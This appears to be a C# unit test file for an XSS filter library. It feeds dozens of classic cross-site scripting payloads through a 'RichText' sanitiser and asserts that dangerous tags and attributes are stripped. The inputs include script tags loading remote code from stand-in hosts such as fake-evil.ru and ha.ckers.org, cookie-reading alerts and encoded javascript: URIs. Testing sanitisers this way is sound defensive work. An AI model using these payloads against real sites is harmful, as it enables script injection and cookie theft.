﻿using System;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System.Runtime.CompilerServices;
using XSSAttacksFilter;

namespace UnitTestProject1
{
    [TestClass]
    public class UnitTest1
    {
        [TestMethod]
        public void TestMethod1()
        {

            Assert.IsTrue(FilterAttacks("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", str => str.IndexOf("onload") == -1));
            Assert.IsTrue(FilterAttacks("<script src=\"/test.js\"></script>", str => str.IndexOf("script") == -1));
            Assert.IsTrue(FilterAttacks("test<script>alert(document.cookie)</script>", str => str.IndexOf("script") == -1));
            Assert.IsTrue(FilterAttacks("<<<><<script src=http://fake-evil.ru/test.js>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<script<script src=http://fake-evil.ru/test.js>>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", str => str.IndexOf("onload") == -1));
            Assert.IsTrue(FilterAttacks("<BODY ONLOAD=alert('XSS')>", str => str.IndexOf("alert") == -1));
            Assert.IsTrue(FilterAttacks("<iframe src=http://ha.ckers.org/scriptlet.html <", str => str.IndexOf("<iframe") == -1));
            Assert.IsTrue(FilterAttacks("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", str => str.IndexOf("src") == -1));
          
            Assert.IsTrue(FilterAttacks("<div style=\"position:absolute\">", str => str.IndexOf("position") == -1));
            Assert.IsTrue(FilterAttacks("<style>b { position:absolute }</style>", str => str.IndexOf("position") == -1));
            Assert.IsTrue(FilterAttacks("<div style=\"z-index:25\">", str => str.IndexOf("z-index:25")>0));
            Assert.IsTrue(FilterAttacks("<style>z-index:25</style>", str => str.IndexOf("z-index:25") == -1));


            Assert.IsTrue(FilterAttacks("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS'));\">", str => str.IndexOf("href") == -1));
            Assert.IsTrue(FilterAttacks("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", str => str.IndexOf("href") == -1));

            Assert.IsTrue(FilterAttacks("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", str => str.IndexOf("ha.ckers.org") == -1));

            Assert.IsTrue(FilterAttacks("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", str => str.IndexOf("ha.ckers.org") == -1));

            Assert.IsTrue(FilterAttacks("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", str => str.IndexOf("xss.htc") == -1));

            Assert.IsTrue(FilterAttacks("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\"));}</STYLE><UL><LI>XSS", str => str.IndexOf("javascript") == -1));

            Assert.IsTrue(FilterAttacks("<IMG SRC='vbscript:msgbox(\"XSS\")'>", str => str.IndexOf("vbscript") == -1));


            Assert.IsTrue(FilterAttacks("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS'));\">", str => str.IndexOf("<meta") == -1));
            Assert.IsTrue(FilterAttacks("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS'));\">", str => str.IndexOf("<meta") == -1));
            Assert.IsTrue(FilterAttacks("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", str => str.IndexOf("<meta") == -1));
            Assert.IsTrue(FilterAttacks("<IFRAME SRC=\"javascript:alert('XSS'));\"></IFRAME>", str => str.IndexOf("iframe") == -1));
            Assert.IsTrue(FilterAttacks("<FRAMESET><FRAME SRC=\"javascript:alert('XSS'));\"></FRAMESET>", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", str => str.IndexOf("background") == -1));
            Assert.IsTrue(FilterAttacks("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", str => str.IndexOf("background") == -1));
            Assert.IsTrue(FilterAttacks("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<DIV STYLE=\"width: expression(alert('XSS')));\">", str => str.IndexOf("alert") == -1));
            Assert.IsTrue(FilterAttacks("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", str => str.IndexOf("alert") == -1));

            Assert.IsTrue(FilterAttacks("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", str => str.IndexOf("ript:alert") == -1));

            Assert.IsTrue(FilterAttacks("<BASE HREF=\"javascript:alert('XSS'));//\">", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<BaSe hReF=\"http://arbitrary.com/\">", str => str.IndexOf("<base") == -1));
            Assert.IsTrue(FilterAttacks("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", str => str.IndexOf("<object") == -1));
            Assert.IsTrue(FilterAttacks("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", str => str.IndexOf("<object") == -1));
            Assert.IsTrue(FilterAttacks("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", str => str.IndexOf("<embed") == -1));
            Assert.IsTrue(FilterAttacks("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", str => str.IndexOf("<embed") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT>document.write(\"<SCRI\"));</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", str => str.IndexOf("script") == -1));
            Assert.IsTrue(FilterAttacks("<SCRIPT SRC=http://ha.ckers.org/xss.js", str => str.IndexOf("<script") == -1));
            Assert.IsTrue(FilterAttacks("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", str => str.IndexOf("style") == -1));
            Assert.IsTrue(FilterAttacks("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", str => str.IndexOf("aim.exe") == -1));
            Assert.IsTrue(FilterAttacks("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", str => str.IndexOf("document") == -1));

            Assert.IsTrue(FilterAttacks("<img src='http://www.myspace.com/img.gif'>", str => str.IndexOf("<img") != -1));
            Assert.IsTrue(FilterAttacks("<img src=javascript:alert(document.cookie)>", str => str.IndexOf("<img") == -1));
            Assert.IsTrue(FilterAttacks("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", str => str.IndexOf("<img") == -1));

            //testScriptAttacks("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",str=>str.IndexOf("src")==-1));
            //testScriptAttacks("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",str=>str.IndexOf("&amp;")==-1));
            Assert.IsTrue(FilterAttacks("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", str => str.IndexOf("&amp;") != -1));
            Assert.IsTrue(FilterAttacks("&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", str => str.IndexOf("&amp;") != -1));
            Assert.IsTrue(FilterAttacks("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", str => str.IndexOf("&amp;") != -1));

            Assert.IsTrue(FilterAttacks("<IMG SRC=\"jav&#x0D;ascript:alert('XSS'));\">", str => str.IndexOf("alert") == -1));
            Assert.IsTrue(FilterAttacks("<IMG SRC=\"javascript:alert('XSS')\"", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<IMG LOWSRC=\"javascript:alert('XSS')\">", str => str.IndexOf("javascript") == -1));
            Assert.IsTrue(FilterAttacks("<BGSOUND SRC=\"javascript:alert('XSS'));\">", str => str.IndexOf("javascript") == -1));

        }
        bool FilterAttacks(string str, Func<string, bool> fn)
        {
            //这里是启用默认的安全策略
            return fn(((RichText)str));
        }
    }
}
